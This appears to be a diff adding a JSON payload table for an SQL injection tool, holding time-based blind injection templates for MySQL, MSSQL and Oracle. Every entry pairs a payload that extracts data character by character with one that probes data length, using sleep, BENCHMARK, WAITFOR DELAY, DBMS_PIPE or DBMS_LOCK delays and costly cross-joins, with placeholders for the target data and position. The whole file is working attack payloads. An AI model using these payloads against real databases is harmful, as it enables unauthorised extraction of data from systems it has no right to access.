@@ -1,0 +1,80 @@
+{
+ "mysql": [
+  {
+   "payload": "and(if(ascii(mid([DATA],[POSITION],1))=[DATANUM],sleep(6),1))",
+   "length_payload": "and(if(length([DATA])=[DATANUM],sleep(6),1))"
+  },
+  {
+   "payload": "and(elt(ascii(mid([DATA],[POSITION],1))=[DATANUM],sleep(6),1))",
+   "length_payload": "and(if(length([DATA])=[DATANUM],sleep(6),1))"
+  },
+  {
+   "payload": "and(elt(ascii(mid([DATA],[POSITION],1))=[DATANUM],BENCHMARK(64000000,MD5(1)),1))",
+   "length_payload": "and(elt(length([DATA])=[DATANUM],sleep(6),1))"
+  },
+  {
+   "payload": "or(if(ascii(mid([DATA],[POSITION],1))=[DATANUM],sleep(6),1))",
+   "length_payload": "or(if(length([DATA])=[DATANUM],sleep(6),1))"
+  },
+  {
+   "payload": "or(elt(ascii(mid([DATA],[POSITION],1))=[DATANUM],sleep(6),1))",
+   "length_payload": "or(if(length([DATA])=[DATANUM],sleep(6),1))"
+  },
+  {
+   "payload": "or(elt(ascii(mid([DATA],[POSITION],1))=[DATANUM],BENCHMARK(64000000,MD5(1)),1))",
+   "length_payload": "or(elt(length([DATA])=[DATANUM],sleep(6),1))"
+  }
+ ],
+ "mssql": [
+  {
+    "payload": "IF(ascii(substring([DATA],[POSITION],1))like'[DATANUM]') WAITFOR DELAY '0:0:6'",
+    "length_payload": "IF(len([DATA])like'[DATANUM]') WAITFOR DELAY '0:0:6'"
+  },
+  {
+   "payload": "and 1=(SELECT (CASE WHEN (ascii(substring([DATA],[POSITION],1))=[DATANUM]) THEN (SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7,sysusers AS sys8,users AS sys9) ELSE 7 END))",
+   "length_payload": "and 1=(SELECT (CASE WHEN (len([DATA])=[DATANUM]) THEN (SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7,sysusers AS sys8,users AS sys9) ELSE 7 END))"
+  },
+  {
+   "payload": "or 1=(SELECT (CASE WHEN (ascii(substring([DATA],[POSITION],1))=[DATANUM]) THEN (SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7,sysusers AS sys8,users AS sys9) ELSE 7 END))",
+   "length_payload": "or 1=(SELECT (CASE WHEN (len([DATA])=[DATANUM]) THEN (SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7,sysusers AS sys8,users AS sys9) ELSE 7 END))"
+  },
+  {
+   "payload": "IF(ascii(substring([DATA],[POSITION],1))=[DATANUM]) WAITFOR DELAY '0:0:6'",
+   "length_payload": "IF(len([DATA])=[DATANUM]) WAITFOR DELAY '0:0:6'"
+  },
+  {
+   "payload": "and 1=(SELECT (CASE WHEN (ascii(substring([DATA],[POSITION],1))like'[DATANUM]') THEN (SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7,sysusers AS sys8,users AS sys9) ELSE 7 END))",
+   "length_payload": "and 1=(SELECT (CASE WHEN (len([DATA])=[DATANUM]) THEN (SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7,sysusers AS sys8,users AS sys9) ELSE 7 END))"
+  },
+  {
+   "payload": "or 1=(SELECT (CASE WHEN (ascii(substring([DATA],[POSITION],1))like'[DATANUM]') THEN (SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7,sysusers AS sys8,users AS sys9) ELSE 7 END))",
+   "length_payload": "or 1=(SELECT (CASE WHEN (len([DATA])=[DATANUM]) THEN (SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7,sysusers AS sys8,users AS sys9) ELSE 7 END))"
+  }
+ ],
+ "oracle": [
+  {
+    "payload": "and 1=case when(ascii(substr([DATA],[POSITION],1))=[DATANUM]) then DBMS_PIPE.RECEIVE_MESSAGE(1,6) else 0 end",
+    "length_payload": "and 1=case when(length([DATA])=[DATANUM]) then DBMS_PIPE.RECEIVE_MESSAGE(1,6) else 0 end"
+  },
+  {
+    "payload": "or 1=case when(ascii(substr([DATA],[POSITION],1))=[DATANUM]) then DBMS_PIPE.RECEIVE_MESSAGE(1,6) else 0 end",
+    "length_payload": "or 1=case when(length([DATA])=[DATANUM]) then DBMS_PIPE.RECEIVE_MESSAGE(1,6) else 0 end"  
+  },
+  {
+   "payload": "and 1=(SELECT (CASE WHEN (ascii(substr([DATA],[POSITION],1))=[DATANUM]) THEN (SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5) ELSE 222 END) FROM DUAL)",
+   "length_payload": "and 1=(SELECT (CASE WHEN (length([DATA])=[DATANUM]) THEN (SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5) ELSE 222 END) FROM DUAL)"
+  },
+  {
+   "payload": "or 1=(SELECT (CASE WHEN (ascii(substr([DATA],[POSITION],1))=[DATANUM]) THEN (SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5) ELSE 222 END) FROM DUAL)",
+   "length_payload": "or 1=(SELECT (CASE WHEN (length([DATA])=[DATANUM]) THEN (SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5) ELSE 222 END) FROM DUAL)"  
+  },
+  {
+   "payload": "and(BEGIN IF (ascii(substr([DATA],[POSITION],1))=[DATANUM]) THEN DBMS_LOCK.sleep(6); ELSE DBMS_LOCK.SLEEP(0); END IF; END;)",
+   "length_payload": "and(BEGIN IF (length([DATA])=[DATANUM]) THEN DBMS_LOCK.sleep(6); ELSE DBMS_LOCK.SLEEP(0); END IF; END;)"
+  },
+  {
+   "payload": "or(BEGIN IF (ascii(substr([DATA],[POSITION],1))=[DATANUM]) THEN DBMS_LOCK.sleep(6); ELSE DBMS_LOCK.SLEEP(0); END IF; END;)",
+   "length_payload": "or(BEGIN IF (length([DATA])=[DATANUM]) THEN DBMS_LOCK.sleep(6); ELSE DBMS_LOCK.SLEEP(0); END IF; END;)"  
+  }
+ ]
+}
